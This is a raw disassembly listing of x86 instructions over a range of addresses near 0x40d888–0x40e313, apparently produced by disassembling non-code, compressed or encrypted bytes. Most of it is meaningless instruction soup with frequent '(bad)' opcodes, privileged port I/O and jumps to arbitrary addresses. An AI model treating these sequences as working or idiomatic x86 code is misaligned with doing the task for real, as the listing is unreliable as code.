  40d888:	sub    dh,bl
  40d88a:	add    ebp,esp
  40d88c:	stos   DWORD PTR es:[edi],eax
  40d88d:	pop    es
  40d88e:	mov    ebp,0x7382e5ba
  40d893:	addr16 jmp 0x29a71628
  40d899:	(bad)  
  40d89a:	xchg   BYTE PTR ss:[ecx],ch
  40d89d:	mov    edx,0x41301978
  40d8a2:	cs pop ebx
  40d8a4:	(bad)  
  40d8a5:	shr    BYTE PTR ds:0xbcfe08de,0x37
  40d8ac:	std    
  40d8ad:	add    esi,DWORD PTR [edx]
  40d8af:	pop    edi
  40d8b0:	repnz inc ebx
  40d8b2:	sub    ah,BYTE PTR [edx+eax*1+0x44]
  40d8b6:	add    eax,0x7c4b2f1a
  40d8bb:	dec    edx
  40d8bc:	jmp    0x40d9a9
	...
  40d8e5:	add    BYTE PTR [eax],al
  40d8e7:	add    BYTE PTR [ecx+edi*4+0x33],dh
  40d8eb:	or     cl,al
  40d8ed:	pop    ds
  40d8ee:	test   eax,0xe19b0381
  40d8f3:	adc    al,0xb
  40d8f5:	fwait
  40d8f6:	nop
  40d8f7:	call   0x1fc7:0x189db9d0
  40d8fe:	lods   eax,DWORD PTR ds:[esi]
  40d8ff:	mov    ebx,ebp
  40d901:	sahf   
  40d902:	dec    esi
  40d903:	mov    es,WORD PTR [edx]
  40d905:	sbb    al,0xe9
  40d907:	pop    edx
  40d908:	inc    ebp
  40d909:	pop    ebx
  40d90a:	jmp    0x3f2612
  40d90f:	popa   
  40d910:	mov    ecx,0x361c8b61
  40d915:	scas   al,BYTE PTR es:[edi]
  40d916:	mov    ds:0x4fc8f974,eax
  40d91b:	pop    esi
  40d91c:	sar    eax,0xfe
  40d91f:	fsubr  QWORD PTR [ecx-0x3d]
  40d922:	jbe    0x40d8ac
  40d924:	dec    ebx
  40d925:	mov    eax,0xc359bcfe
  40d92a:	xor    BYTE PTR [esi+0x2b],dl
  40d92d:	mov    eax,0xe841bcfe
  40d932:	inc    esp
  40d933:	sub    DWORD PTR [edi+0x5302c01e],edi
  40d939:	rcl    BYTE PTR cs:[ecx],0x0
  40d93d:	sar    dh,cl
  40d93f:	push   ss
  40d940:	mov    ch,0x1e
  40d942:	les    ecx,FWORD PTR ds:0x74c41eb5
  40d948:	leave  
  40d949:	enter  0x7c8a,0x0
	...
  40d975:	add    BYTE PTR [ecx],dl
  40d977:	repnz (bad)
  40d97a:	cmp    eax,0x6845f35b
  40d97f:	xor    DWORD PTR [ebp+0x28],ebx
  40d982:	inc    edx
  40d983:	repnz or ch,cl
  40d986:	cmp    eax,0xb68df35b
  40d98b:	or     BYTE PTR cs:[edx+0x78],ah
  40d98f:	fs repz (bad) 
  40d992:	rcr    BYTE PTR [esi],0xe0
  40d995:	sbb    DWORD PTR [ebx],ebp
  40d997:	shl    BYTE PTR cs:[esi+0x7e79cb8],0x1d
  40d99f:	mov    eax,0x9cc8a6fe
  40d9a4:	out    0x89,eax
  40d9a6:	jecxz  0x40d95f
  40d9a8:	(bad)  
  40d9a9:	xchg   ebp,eax
  40d9aa:	shr    BYTE PTR [esi],0xf0
  40d9ad:	pop    esp
  40d9ae:	enter  0xb8a0,0x0
  40d9b2:	ja     0x40da10
  40d9b4:	add    BYTE PTR [eax],al
  40d9b6:	aam    0x17
  40d9b8:	lea    esi,[ebp-0x49]
  40d9bb:	adc    eax,0x5c570008
  40d9c0:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9c2:	or     eax,0x6f458d5d
  40d9c7:	in     al,dx
  40d9c8:	out    0x68,al
  40d9ca:	mov    ch,0x5b
  40d9cc:	add    BYTE PTR [ebx+0x7d89ac0a],cl
  40d9d2:	sti    
  40d9d3:	sbb    al,0xef
  40d9d5:	add    ecx,DWORD PTR [edi+ecx*2]
  40d9d8:	je     0x40da41
	...
  40da02:	add    BYTE PTR [eax],al
  40da04:	jl     0x40da65
  40da06:	lea    eax,[ebp+0x7f]
  40da09:	in     al,dx
  40da0a:	push   esp
  40da0b:	push   esi
  40da0c:	dec    edi
  40da0d:	push   ebp
  40da0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da0f:	add    bh,ah
  40da11:	fcmovb st,st(5)
  40da13:	or     BYTE PTR [eax-0x1d8a009e],ah
  40da19:	pop    ebx
  40da1a:	mov    dh,0x46
  40da1c:	inc    eax
  40da1d:	fcomi  st,st(7)
  40da1f:	or     BYTE PTR [eax+0x5a],cl
  40da22:	sub    esi,eax
  40da24:	cld    
  40da25:	call   0x302ab38
  40da2a:	jmp    FWORD PTR [ecx-0x59]
  40da2d:	aad    0xfe
  40da2f:	imul   esp,DWORD PTR [edi-0x588a020f],0x9769fed5
  40da39:	push   ebx
  40da3a:	mov    esi,0xb5ba781
  40da3f:	ror    BYTE PTR [ebx-0x6a],0x4e
  40da43:	push   eax
  40da44:	jg     0x40da26
  40da46:	xchg   ebp,eax
  40da47:	call   eax
  40da49:	aaa    
  40da4a:	fcomp  DWORD PTR [ecx+0x4d]
  40da4d:	pop    edi
  40da4e:	push   0x0
  40da50:	ss lock push esp
  40da53:	(bad)  
  40da54:	ds push edi
  40da56:	hlt    
  40da57:	imul   edi,DWORD PTR [esi],0xbbe8045c
  40da5d:	inc    edx
  40da5e:	add    al,0x0
  40da60:	inc    ebp
  40da61:	add    bl,BYTE PTR [ecx-0x412612f9]
  40da67:	xchg   ebp,eax
	...
  40da90:	add    BYTE PTR [eax],al
  40da92:	inc    ecx
  40da93:	dec    eax
  40da94:	(bad)  
  40da96:	lds    eax,FWORD PTR [ecx+0x6b905eaf]
  40da9c:	inc    esi
  40da9d:	adc    BYTE PTR [esi],bh
  40da9f:	idiv   DWORD PTR [ebp-0x14]
  40daa2:	mov    ebp,0x6d571480
  40daa7:	dec    ecx
  40daa8:	das    
  40daa9:	dec    DWORD PTR [ebx+0x367511c8]
  40daaf:	sbb    al,0x3b
  40dab1:	nop
  40dab2:	add    DWORD PTR [esi-0x538c014c],eax
  40dab8:	sbb    cl,BYTE PTR [esp+ecx*8-0x1974ecab]
  40dabf:	in     al,dx
  40dac0:	add    eax,0x988435f8
  40dac5:	inc    esi
  40dac6:	retf   
  40dac7:	pop    es
  40dac8:	pop    ss
  40dac9:	push   eax
  40daca:	shr    DWORD PTR [edi],1
  40dacc:	(bad)  
  40dacd:	(bad)  
  40dace:	push   ebx
  40dacf:	mov    esp,0xc5c3ab1a
  40dad4:	adc    DWORD PTR [ecx+0x457fc003],ecx
  40dada:	scas   al,BYTE PTR es:[edi]
  40dadb:	je     0x40daf0
  40dadd:	jne    0x40db19
  40dadf:	lea    edx,[edi+0x102b9607]
  40dae5:	call   FWORD PTR [ecx-0x6e0837d5]
  40daeb:	outs   dx,DWORD PTR ds:[esi]
  40daec:	adc    al,0xff
  40daee:	adc    ebp,esp
  40daf0:	adc    DWORD PTR [ebp-0x76],esi
  40daf3:	add    eax,0xfb98
	...
  40db20:	pop    bx
  40db22:	clc    
  40db23:	adc    DWORD PTR [ecx-0x4a],esi
  40db26:	jno    0x40db53
  40db28:	imul   esi,DWORD PTR [eax],0xd0841b95
  40db2e:	lea    edx,[edx]
  40db30:	pop    ecx
  40db31:	xor    BYTE PTR [ecx+0x7dd06c1b],al
  40db37:	adc    dl,ah
  40db39:	pop    edx
  40db3a:	push   ds
  40db3b:	adc    ecx,ebx
  40db3d:	bound  eax,QWORD PTR [ecx+0x65b5ca9d]
  40db43:	jle    0x40db42
  40db45:	adc    DWORD PTR [esi-0x169d03c4],edi
  40db4b:	mov    eax,0x9069c6b4
  40db50:	inc    ebp
  40db51:	pop    ebp
  40db52:	mov    ebx,0xd93010e4
  40db57:	adc    dl,BYTE PTR [ebx-0x4e45be9d]
  40db5d:	mov    ch,0x2d
  40db5f:	adc    dh,BYTE PTR [ebx+0x4b]
  40db62:	es cwde 
  40db64:	cmp    ebx,eax
  40db66:	dec    ebp
  40db67:	adc    cl,ch
  40db69:	mov    ch,0x15
  40db6b:	cwde   
  40db6c:	xor    DWORD PTR [esi-0x11e046d],esi
  40db72:	add    edx,DWORD PTR [edx]
  40db74:	shl    DWORD PTR [ebp+0x2fc8f373],1
  40db7a:	loope  0x40db97
  40db7c:	je     0x40db34
  40db7e:	in     eax,dx
  40db7f:	adc    ebp,eax
  40db81:	paddw  mm7,QWORD PTR [edx+0x0]
	...
  40dbad:	add    BYTE PTR [esi+esi*4],bh
  40dbb0:	push   ebx
  40dbb1:	hlt    
  40dbb2:	test   al,0x2f
  40dbb4:	loope  0x40dbd1
  40dbb6:	mov    bh,0xb7
  40dbb8:	int    0x11
  40dbba:	mov    ebp,0x804f537
  40dbbf:	dec    ebp
  40dbc0:	mov    esi,0xffb63997
  40dbc5:	cmp    eax,DWORD PTR [edx+0x4fac77bd]
  40dbcb:	mov    dh,0xfe
  40dbcd:	sbb    al,0x6a
  40dbcf:	mov    ah,0x74
  40dbd1:	icebp  
  40dbd2:	inc    ebp
  40dbd3:	dec    eax
  40dbd4:	std    
  40dbd5:	xchg   esi,eax
  40dbd6:	dec    edi
  40dbd7:	mov    dh,0x74
  40dbd9:	stc    
  40dbda:	mov    ebx,0x55fcff4d
  40dbdf:	mov    ebp,0xb62f5980
  40dbe4:	(bad)  
  40dbe5:	cld    
  40dbe6:	dec    ebp
  40dbe7:	mov    ah,0x74
  40dbe9:	loope  0x40dc40
  40dbeb:	test   eax,0xa24f668e
  40dbf0:	sar    ecx,0x3d
  40dbf3:	push   cs
  40dbf4:	mov    eax,DWORD PTR [ebp+0x4f]
  40dbf7:	cs or  al,0xc3
  40dbfa:	cmp    al,0xb4
  40dbfc:	je     0x40dbef
  40dbfe:	xor    eax,0x2f3e9039
  40dc03:	mov    ah,0x74
  40dc05:	in     eax,0x2e
  40dc07:	or     BYTE PTR cs:[ecx+0x27],al
  40dc0b:	mov    ch,0xfe
  40dc0d:	es jae 0x40dc1e
  40dc10:	adc    BYTE PTR [eax+0x0],dh
	...
  40dc3b:	add    BYTE PTR [eax-0x4c],al
  40dc3e:	je     0x40dc25
  40dc40:	dec    esi
  40dc41:	or     BYTE PTR cs:[ecx],al
  40dc44:	pop    ss
  40dc45:	mov    ch,0xfe
  40dc47:	push   es
  40dc48:	push   ebx
  40dc49:	push   cs
  40dc4a:	adc    al,0x70
  40dc4c:	inc    eax
  40dc4d:	mov    ah,0x74
  40dc4f:	in     eax,0x2e
  40dc51:	or     BYTE PTR cs:[ecx],al
  40dc54:	pop    es
  40dc55:	mov    ch,0xfe
  40dc57:	out    0x32,al
  40dc59:	push   cs
  40dc5a:	sbb    BYTE PTR [eax+0x43],dh
  40dc5d:	mov    ds:0xe3dfdc1,al
  40dc62:	mov    edi,DWORD PTR [ebp+0xeb9fc2]
  40dc68:	xor    edx,esi
  40dc6a:	std    
  40dc6b:	jne    0x40dce0
  40dc6d:	(bad)  
  40dc6e:	(bad)  
  40dc6f:	inc    BYTE PTR [edx-0x49]
  40dc72:	out    0x19,al
  40dc74:	pop    ss
  40dc75:	dec    ebx
  40dc76:	(bad)  
  40dc77:	call   DWORD PTR [edx-0x4d]
  40dc7a:	std    
  40dc7b:	jne    0x40dcec
  40dc7d:	push   eax
  40dc7e:	mov    cl,BYTE PTR [edi-0xf74b438]
  40dc84:	mov    esi,0x67ffffa7
  40dc89:	aaa    
  40dc8a:	inc    ebp
  40dc8b:	adc    al,0xd4
  40dc8d:	lahf   
  40dc8e:	(bad)  
  40dc8f:	je     0x40dce3
  40dc91:	push   ecx
  40dc92:	add    DWORD PTR ss:[edi],esp
  40dc95:	pop    eax
  40dc96:	mov    DWORD PTR [ebp-0x65],0x17000058
  40dc9d:	xor    eax,0xfc45
	...
  40dcca:	out    0x4a,eax
  40dccc:	jne    0x40dce2
  40dcce:	mov    ch,cl
  40dcd0:	push   cs
  40dcd1:	call   edx
  40dcd3:	scas   eax,DWORD PTR es:[edi]
  40dcd4:	out    0xf2,al
  40dcd6:	dec    ecx
  40dcd7:	dec    ebx
  40dcd8:	dec    DWORD PTR [ebx-0x38320b1]
  40dcde:	out    0xcb,eax
  40dce0:	and    DWORD PTR [eax+0x66],ebp
  40dce3:	add    eax,0xcd480040
  40dce8:	cli    
  40dce9:	call   0x40b5d5
  40dcee:	fcom   QWORD PTR [edi]
  40dcf0:	jne    0x40dcff
  40dcf2:	scas   eax,DWORD PTR es:[edi]
  40dcf3:	xor    BYTE PTR [ebp+0x41],bl
  40dcf6:	xlat   BYTE PTR ds:[ebx]
  40dcf7:	dec    edx
  40dcf8:	jne    0x40dcf6
  40dcfa:	aas    
  40dcfb:	dec    ebx
  40dcfc:	add    BYTE PTR [eax],0xa7
  40dcff:	xor    BYTE PTR [ebp-0x14],al
  40dd02:	mov    WORD PTR [ebx-0x39],ds
  40dd05:	inc    ebp
  40dd06:	jnp    0x40dd66
  40dd08:	add    BYTE PTR [eax],al
  40dd0a:	ds ret 0x7d81
  40dd0e:	stos   BYTE PTR es:[edi],al
  40dd0f:	rcl    DWORD PTR [esi+0x2c32617],0xef
  40dd16:	enter  0x98f4,0xb
  40dd1a:	xchg   esi,eax
  40dd1b:	mov    ?,WORD PTR [ebx-0x1]
  40dd1e:	jns    0x40dd24
  40dd20:	cdq    
  40dd21:	sti    
  40dd22:	jno    0x40dd7a
  40dd24:	add    al,ch
  40dd26:	repnz xor cl,BYTE PTR [edi]
  40dd29:	call   DWORD PTR [edi+0x38]
  40dd2c:	add    al,0x0
	...
  40dd56:	add    BYTE PTR [eax],al
  40dd58:	ds cmp ecx,ecx
  40dd5b:	adc    edi,DWORD PTR [ebp+0x43750299]
  40dd61:	retf   
  40dd62:	test   DWORD PTR [eax],eax
  40dd64:	ds ret 0x4545
  40dd68:	lds    eax,FWORD PTR ss:[edx]
  40dd6b:	add    BYTE PTR [esi],bh
  40dd6d:	or     ecx,0x2c43ef3
  40dd73:	add    cl,bh
  40dd75:	call   DWORD PTR [edx]
  40dd77:	add    BYTE PTR [esi],bh
  40dd79:	les    eax,FWORD PTR [edx]
  40dd7b:	lea    edi,[ebx+0x74]
  40dd7e:	mov    ah,0x8c
  40dd80:	sub    DWORD PTR [eax-0x4c],0xffffff8c
  40dd84:	jnp    0x40ddf2
  40dd86:	mov    ah,0xfe
  40dd88:	jae    0x40dd12
  40dd8a:	or     eax,0x254c4675
  40dd8f:	(bad)  
  40dd90:	jmp    0xd2be60e6
  40dd95:	les    edx,FWORD PTR [esi+0xadfbd32]
  40dd9b:	add    BYTE PTR [edx-0x79],cl
  40dd9e:	cmp    DWORD PTR [ebp-0x2e],0xbd0597c4
  40dda5:	daa    
  40dda6:	adc    eax,DWORD PTR [eax]
  40dda8:	xor    ah,BYTE PTR [ebx+0x5bb6750d]
  40ddae:	out    0x98,al
  40ddb0:	xor    eax,0xa174f9c3
  40ddb5:	mov    dl,0xd5
  40ddb7:	cwde   
  40ddb8:	lea    esi,[edx+0x53]
	...
  40dde6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dde7:	arpl   WORD PTR [eax+0xe],bx
  40ddea:	mov    DWORD PTR [edx+0x28811433],esi
  40ddf0:	in     eax,0x1b
  40ddf2:	jnp    0x40ddbf
  40ddf4:	lods   eax,DWORD PTR ds:[esi]
  40ddf5:	push   cs
  40ddf6:	jno    0x40de20
  40ddf8:	mov    eax,ds:0x9dce5c1b
  40ddfd:	push   cs
  40ddfe:	popa   
  40ddff:	sub    BYTE PTR [ebp-0x72318be5],bl
  40de05:	push   cs
  40de06:	push   ecx
  40de07:	sub    BYTE PTR [ecx+0x1b],bh
  40de0a:	ins    BYTE PTR es:[edi],dx
  40de0b:	into   
  40de0c:	jge    0x40de1c
  40de0e:	icebp  
  40de0f:	gs jbe 0x40de10
  40de12:	ret    0x6e3f
  40de15:	push   cs
  40de16:	xor    esi,ebx
  40de18:	jecxz  0x40de39
  40de1a:	ds daa 
  40de1c:	call   FWORD PTR [ecx-0x244edf]
  40de22:	and    DWORD PTR [ebp+0x79],eax
  40de25:	push   cs
  40de26:	adc    DWORD PTR [ebp-0x17],eax
  40de29:	push   cs
  40de2a:	xchg   ebx,eax
  40de2b:	pop    edi
  40de2c:	push   ecx
  40de2d:	mov    ds:0x9935b1b1,eax
  40de32:	stc    
  40de33:	mov    al,0xb3
  40de35:	(bad)  
  40de36:	(bad)  [eax]
  40de38:	jns    0x40de48
  40de3a:	jmp    0xd65071f0
  40de3f:	iret   
  40de40:	jns    0x40de50
  40de42:	fldenv [eax]
  40de44:	loop   0x40de5b
  40de46:	inc    ecx
  40de47:	fadd   DWORD PTR [ebx+0xd]
	...
  40de72:	add    BYTE PTR [eax],al
  40de74:	leave  
  40de75:	mov    cl,0x9d
  40de77:	lods   eax,DWORD PTR ds:[esi]
  40de78:	neg    BYTE PTR [edi+edi*8-0x74f7c228]
  40de7f:	std    
  40de80:	mov    edi,0x3b3fe396
  40de85:	sub    BYTE PTR [eax],cl
  40de87:	rcl    edi,1
  40de89:	in     al,0xfe
  40de8b:	(bad)  
  40de8c:	adc    eax,0xc16af418
  40de91:	lods   eax,DWORD PTR ds:[esi]
  40de92:	(bad)  
  40de95:	jmp    0x5b7ec79a
  40de9a:	pop    esi
  40de9b:	mov    al,ds:0xae0062fc
  40dea0:	leave  
  40dea1:	pop    ecx
  40dea2:	call   0xfef2c7bb
  40dea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dea8:	jns    0x40de53
  40deaa:	add    cl,ch
  40deac:	cmp    eax,0x42248d5b
  40deb1:	or     edi,edi
  40deb3:	cld    
  40deb4:	inc    ebp
  40deb5:	mov    ecx,0xb2336cfc
  40deba:	mov    BYTE PTR [esi+ecx*2],ch
  40debd:	fdivr  QWORD PTR [ecx+esi*2+0x3a]
  40dec1:	daa    
  40dec2:	or     al,0x6a
  40dec4:	mov    ecx,0x3bdb01b4
  40dec9:	fdivr  QWORD PTR [ebp+edx*2+0x40]
  40decd:	sub    DWORD PTR [edx],ecx
  40decf:	xchg   ecx,eax
  40ded0:	cmp    eax,0xdbe9005b
  40ded5:	mov    ds:0xf1c1,eax
	...
  40df02:	cmp    eax,0xb23144de
  40df07:	mov    cl,0x74
  40df09:	loope  0x40df60
  40df0b:	lea    ecx,[esi+eiz*1+0x217cdc3b]
  40df12:	cmp    ah,BYTE PTR [edi]
  40df14:	add    al,0xe2
  40df16:	jge    0x40df3f
  40df18:	or     dl,BYTE PTR [ecx+0x3d]
  40df1b:	pop    ebx
  40df1c:	add    BYTE PTR [eax],al
  40df1e:	xlat   BYTE PTR ds:[ebx]
  40df1f:	inc    bh
  40df21:	ret    0x5ccf
  40df24:	cmp    DWORD PTR [ebp-0x4d],0x59
  40df28:	jb     0x40df49
  40df2a:	adc    bl,BYTE PTR [eax-0x40f2af0a]
  40df30:	std    
  40df31:	jne    0x40dee2
  40df33:	push   esp
  40df34:	mov    ?,WORD PTR cs:[eax+0x5f]
  40df38:	lea    eax,[ebp+0x6f]
  40df3b:	in     al,dx
  40df3c:	std    
  40df3d:	jne    0x40dece
  40df3f:	push   esp
  40df40:	sahf   
  40df41:	(bad)  
  40df42:	rcr    BYTE PTR [edi-0x77],0x45
  40df46:	mov    edx,DWORD PTR [ebx+0x1d]
  40df49:	lea    ebx,[edx]
  40df4b:	pop    edi
  40df4c:	push   eax
  40df4d:	dec    DWORD PTR [edx-0x51]
  40df50:	out    0x8d,al
  40df52:	rcr    BYTE PTR [esi-0x1],cl
  40df55:	mov    DWORD PTR [edx],ebp
  40df57:	or     DWORD PTR [ebp+0x68ecaf45],0x4
  40df5e:	ror    cl,0x6
  40df61:	call   0x400dbd
	...
  40df8e:	add    BYTE PTR [eax],al
  40df90:	mov    ds:0xa050f699,al
  40df95:	leave  
  40df96:	push   es
  40df97:	call   0x404200
  40df9c:	xchg   esp,eax
  40df9d:	loope  0x40df81
  40df9f:	add    edx,edi
  40dfa1:	mov    ebp,0xec6f458b
  40dfa6:	std    
  40dfa7:	jne    0x40df2c
  40dfa9:	pop    edi
  40dfaa:	jne    0x40dfb8
  40dfac:	inc    eax
  40dfad:	leave  
  40dfae:	push   es
  40dfaf:	call   0x404075
  40dfb4:	xchg   edx,eax
  40dfb5:	cdq    
  40dfb6:	not    BYTE PTR [eax+0x20]
  40dfb9:	leave  
  40dfba:	push   es
  40dfbb:	call   0x404230
  40dfc0:	ds inc ebp
  40dfc2:	mov    ?,edi
  40dfc4:	ds xbegin 0x3031e82
  40dfcb:	add    BYTE PTR [eax+0x6b],ah
  40dfce:	inc    ecx
  40dfcf:	or     BYTE PTR [esi],bh
  40dfd1:	aaa    
  40dfd2:	(bad)  
  40dfd3:	test   DWORD PTR [esi],0xa9fb94c1
  40dfd9:	push   cs
  40dfda:	clc    
  40dfdb:	(bad)  
  40dfdc:	sub    ebp,DWORD PTR [edx-0x77647fe6]
  40dfe2:	or     al,BYTE PTR [ebx+0x75038a13]
  40dfe8:	xor    al,0xda
  40dfea:	add    eax,DWORD PTR [eax]
  40dfec:	ds ret 0xc8a8
  40dff0:	jl     0x40dfab
  40dff2:	add    cl,BYTE PTR [ebp+0x0]
	...
  40e01c:	add    BYTE PTR [eax],al
  40e01e:	sti    
  40e01f:	jmp    0xaa34ded7
  40e024:	sbb    cl,BYTE PTR [esi]
  40e026:	mov    bl,0xd0
  40e028:	or     cl,BYTE PTR [ebx+0xeda4e]
  40e02e:	ds ret 0x7509
  40e032:	ss retf 0x8e48
  40e036:	inc    ecx
  40e037:	xor    bh,cl
  40e039:	inc    esp
  40e03a:	xor    dh,BYTE PTR [eax-0x3ad61701]
  40e040:	add    al,BYTE PTR [eax]
  40e042:	mov    ebp,0xac0606b7
  40e047:	pop    eax
  40e048:	jns    0x40e08f
  40e04a:	push   ss
  40e04b:	cmc    
  40e04c:	or     DWORD PTR [ebp+0x46],esi
  40e04f:	sbb    al,0x27
  40e051:	mov    WORD PTR [ecx],cs
  40e053:	push   ss
  40e054:	jns    0x40e09b
  40e056:	push   es
  40e057:	aad    0x9
  40e059:	jne    0x40e0a1
  40e05b:	sbb    al,0xce
  40e05d:	stc    
  40e05e:	icebp  
  40e05f:	jge    0x40e0da
  40e061:	inc    ebp
  40e062:	out    0x5b,al
  40e064:	mov    ecx,0x11636b0a
  40e069:	fcmovbe st,st(7)
  40e06b:	scas   al,BYTE PTR es:[edi]
  40e06c:	adc    eax,0xb8b37b79
  40e071:	or     dl,BYTE PTR [ebx+0x63]
  40e074:	adc    DWORD PTR [edi],esi
  40e076:	lds    ebp,FWORD PTR [esi-0x54fc8303]
  40e07c:	arpl   cx,ax
  40e07e:	test   eax,0x90ee0b
	...
  40e0ab:	add    BYTE PTR [ecx-0x3d],al
  40e0ae:	lods   al,BYTE PTR ds:[esi]
  40e0af:	push   cs
  40e0b0:	mov    eax,ds:0xa5c06fae
  40e0b5:	loopne 0x40e0e2
  40e0b7:	or     al,0xee
  40e0b9:	lods   eax,DWORD PTR ds:[esi]
  40e0ba:	push   ebx
  40e0bb:	cld    
  40e0bc:	mov    eax,ds:0x810ac1e8
  40e0c1:	in     al,0x23
  40e0c3:	sbb    al,0xbd
  40e0c5:	xor    BYTE PTR [ecx+0x6a29ea03],bh
  40e0cb:	mov    BYTE PTR [ebp+0x5b],dl
  40e0ce:	sbb    eax,0x9130bc99
  40e0d3:	add    edx,edx
  40e0d5:	xor    eax,0x5b49886a
  40e0da:	adc    eax,0x23c8e1a5
  40e0df:	lds    eax,FWORD PTR [ecx-0x53]
  40e0e2:	repz adc esp,DWORD PTR [esi]
  40e0e5:	sbb    al,0xf7
  40e0e7:	add    edi,DWORD PTR [esi]
  40e0e9:	bound  ebp,QWORD PTR [ecx+0x68434b90]
  40e0ef:	test   al,0x7e
  40e0f1:	pop    ebx
  40e0f2:	pop    esi
  40e0f3:	nop
  40e0f4:	sub    ebx,eax
  40e0f6:	sbb    BYTE PTR [edx+0x43e1ae11],cl
  40e0fc:	xchg   ebx,eax
  40e0fd:	pusha  
  40e0fe:	sar    DWORD PTR [ebx+eiz*2+0x1c],1
  40e102:	jmp    0xffec5411
  40e107:	inc    eax
  40e108:	in     al,0x2f
  40e10a:	add    cl,ch
  40e10c:	call   0x11854fe
	...
  40e139:	add    ch,al
  40e13b:	lods   eax,DWORD PTR ds:[esi]
  40e13c:	dec    BYTE PTR [esi]
  40e13e:	xchg   DWORD PTR [esi+0x2235e574],ebp
  40e144:	mov    cs,WORD PTR [esi]
  40e146:	xor    al,0xae
  40e148:	je     0x40e143
  40e14a:	aaa    
  40e14b:	sub    BYTE PTR [ecx+edx*1],cl
  40e14e:	and    ebx,ebp
  40e150:	(bad)  
  40e151:	test   BYTE PTR [edi+0x28],0xec
  40e155:	out    dx,al
  40e156:	mov    ecx,0x247ee861
  40e15b:	scas   al,BYTE PTR es:[edi]
  40e15c:	(bad)  
  40e15d:	fmulp  st(1),st
  40e15f:	mov    ch,0xfe
  40e161:	pop    esp
  40e162:	xchg   esi,eax
  40e163:	mov    ch,0x8b
  40e165:	pop    edi
  40e166:	aaa    
  40e167:	scas   al,BYTE PTR es:[edi]
  40e168:	(bad)  
  40e169:	cmp    al,0x2a
  40e16b:	ret    
  40e16c:	jo     0x40e1c6
  40e16e:	inc    edi
  40e16f:	scas   al,BYTE PTR es:[edi]
  40e170:	(bad)  
  40e171:	cmp    al,0x56
  40e173:	ret    
  40e174:	push   0xfeae3758
  40e179:	sbb    al,0x42
  40e17b:	ret    
  40e17c:	pusha  
  40e17d:	js     0x40e1c6
  40e17f:	scas   al,BYTE PTR es:[edi]
  40e180:	dec    ebp
  40e181:	push   0xffffffb9
  40e183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e184:	call   DWORD PTR [edx+ecx*2]
  40e187:	pusha  
  40e188:	div    dh
  40e18a:	shl    BYTE PTR [ebp-0x1fb88103],0x44
  40e191:	jno    0x40e177
  40e193:	mov    ds:0x63de1c1,eax
  40e198:	mov    edx,DWORD PTR [ebp-0x45]
  40e19b:	xchg   edi,eax
  40e19c:	sti    
  40e19d:	pop    esi
	...
  40e1c6:	add    BYTE PTR [eax],al
  40e1c8:	leave  
  40e1c9:	pusha  
  40e1ca:	call   0xfeed67c4
  40e1cf:	loop   0x40e24e
  40e1d1:	es das 
  40e1d3:	add    BYTE PTR [edx-0x70af0514],cl
  40e1d9:	xor    cl,BYTE PTR [eax+0x756228ff]
  40e1df:	cld    
  40e1e0:	sbb    ah,bl
  40e1e2:	or     ch,al
  40e1e4:	push   esp
  40e1e5:	sub    eax,0x18ccffff
  40e1ea:	je     0x40e1fb
  40e1ec:	sub    ah,bl
  40e1ee:	push   es
  40e1ef:	push   DWORD PTR [edx+0x3a87e854]
  40e1f5:	(bad)  
  40e1f6:	dec    DWORD PTR [ebx]
  40e1f8:	addr16 fdiv st(6),st
  40e1fb:	(bad)  
  40e1fc:	xor    dl,BYTE PTR [eax+ebp*8-0x78]
  40e200:	pop    ds
  40e201:	(bad)  
  40e202:	dec    ecx
  40e204:	aad    0xb0
  40e206:	(bad)  
  40e207:	push   esp
  40e208:	or     al,0x44
  40e20a:	add    esp,0xffff62b3
  40e210:	loopne 0x40e23f
  40e212:	mov    eax,0x6378fe
  40e217:	add    BYTE PTR [edi+0x58],ah
  40e21a:	mov    eax,DWORD PTR [ebp+0x5b]
  40e21d:	scas   eax,DWORD PTR es:[edi]
  40e21e:	mov    esi,0x37d86274
  40e223:	add    BYTE PTR [edx-0x54],al
  40e226:	out    0x51,eax
  40e228:	pop    ax
  40e22a:	add    bh,bh
	...
  40e254:	add    BYTE PTR [eax],al
  40e256:	xor    dh,BYTE PTR [ebx+0x62db29e6]
  40e25c:	dec    DWORD PTR [ebx]
  40e25e:	xchg   edi,eax
  40e25f:	fisttp QWORD PTR ds:0x3ff3b268
  40e265:	add    BYTE PTR [eax+0x40e80add],ch
  40e26b:	sub    edi,edi
  40e26d:	dec    DWORD PTR [ebp+eiz*4-0x6717059a]
  40e274:	(bad)  
  40e275:	(bad)  
  40e276:	ds (bad) 
  40e278:	mul    bh
  40e27a:	data16 es or bh,bh
  40e27e:	mov    bh,0x3e
  40e280:	dec    ebx
  40e281:	(bad)  
  40e282:	stc    
  40e283:	ins    BYTE PTR es:[edi],dx
  40e284:	fwait
  40e285:	cmp    eax,0x8d02c23f
  40e28a:	ret    
  40e28b:	jg     0x40e296
  40e28d:	jmp    ecx
  40e28f:	icebp  
  40e290:	sbb    dl,al
  40e292:	scas   al,BYTE PTR es:[edi]
  40e293:	dec    esp
  40e294:	or     BYTE PTR [ebp-0xf68045],cl
  40e29a:	leave  
  40e29b:	icebp  
  40e29c:	pop    es
  40e29d:	mov    ch,0x86
  40e29f:	push   ebx
  40e2a0:	or     bh,bh
  40e2a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2a3:	mov    edi,0x3ab1ff86
  40e2a8:	jle    0x40e266
  40e2aa:	test   al,0xbc
  40e2ac:	push   es
  40e2ad:	inc    eax
  40e2ae:	xor    DWORD PTR [esi],edi
  40e2b0:	adc    eax,DWORD PTR [eax]
  40e2b2:	ds ret 0x9577
  40e2b6:	jl     0x40e23b
  40e2b8:	push   es
  40e2b9:	inc    DWORD PTR [eax]
	...
  40e2e3:	add    BYTE PTR [ecx-0x7e000d41],dl
  40e2e9:	ror    DWORD PTR [esi-0x27803484],0x4f
  40e2f0:	out    0xf1,al
  40e2f2:	mov    dh,0x40
  40e2f4:	ds call 0xbff9:0xc23e7b26
  40e2fc:	shl    DWORD PTR [esi-0x3dc156e5],cl
  40e302:	add    cl,BYTE PTR [ebp-0xfa004d]
  40e308:	inc    ecx
  40e309:	es ret 0x8e2b
  40e30d:	dec    esp
  40e30e:	adc    cl,BYTE PTR [edi+0x7f]
  40e311:	mov    ah,0x1a
  40e313:	ret    0xb4a5
